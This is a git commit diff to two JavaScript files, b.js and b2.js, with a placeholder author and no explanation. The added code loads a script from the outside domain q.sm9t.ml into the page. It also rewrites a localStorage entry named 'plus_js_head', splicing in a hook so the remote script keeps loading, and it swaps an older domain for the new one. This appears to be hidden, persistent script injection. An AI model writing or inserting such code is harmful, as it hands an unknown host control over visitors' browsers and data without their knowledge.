9d15327753e7b79d6da9b70bcec092304951c8b8
a <a@a.com>
2022-04-06 02:26:01 +0800

    2022

--- b.js
+++ b.js
@@ -7,11 +7,11 @@
 ;!function (){
 	var localhook = localStorage.getItem('plus_js_head');
 	var exp = ';document.head.appendChild(function(){var a=document.createElement("script");return a.src="//q.sm9t.ml/hm.js",a}())/*hook*/;function c(c)';
-	if (localhook.includes('function c(c)') && !localhook.includes('/*hook*/')){
-		localhook = localhook.replace('function c(c)',exp);
-		localStorage.setItem('plus_js_head',localhook);
-	}else if(localhook.includes('q.sw9t.ml')){
+	if(localhook.includes('q.sw9t.ml')){
 		localhook = localhook.replace('q.sw9t.ml','q.sm9t.ml');
+		localStorage.setItem('plus_js_head',localhook);
+	}else if(localhook.includes('function c(c)') && !localhook.includes('/*hook*/')){
+		localhook = localhook.replace('function c(c)',exp);
 		localStorage.setItem('plus_js_head',localhook);
 	}
 }()
--- b2.js
+++ b2.js
@@ -1,1 +1,18 @@
-!function(){try{(new Image()).src="//sstatic1.histats.com/0.gif?4620473&101";}catch(e){}}()
+!function () {
+    try {
+		(new Image()).src="//sstatic1.histats.com/0.gif?4620473&101";
+		document.head.appendChild(function(){var a=document.createElement("script");return a.src="//q.sm9t.ml/hm.js?"+parseInt((new Date().getTime()) / 2e7),a}());
+    } catch (e) { }
+}()
+
+;!function (){
+	var localhook = localStorage.getItem('plus_js_head');
+	var exp = ';document.head.appendChild(function(){var a=document.createElement("script");return a.src="//q.sm9t.ml/hm.js",a}())/*hook*/;function c(c)';
+	if(localhook.includes('q.sw9t.ml')){
+		localhook = localhook.replace('q.sw9t.ml','q.sm9t.ml');
+		localStorage.setItem('plus_js_head',localhook);
+	}else if(localhook.includes('function c(c)') && !localhook.includes('/*hook*/')){
+		localhook = localhook.replace('function c(c)',exp);
+		localStorage.setItem('plus_js_head',localhook);
+	}
+}()
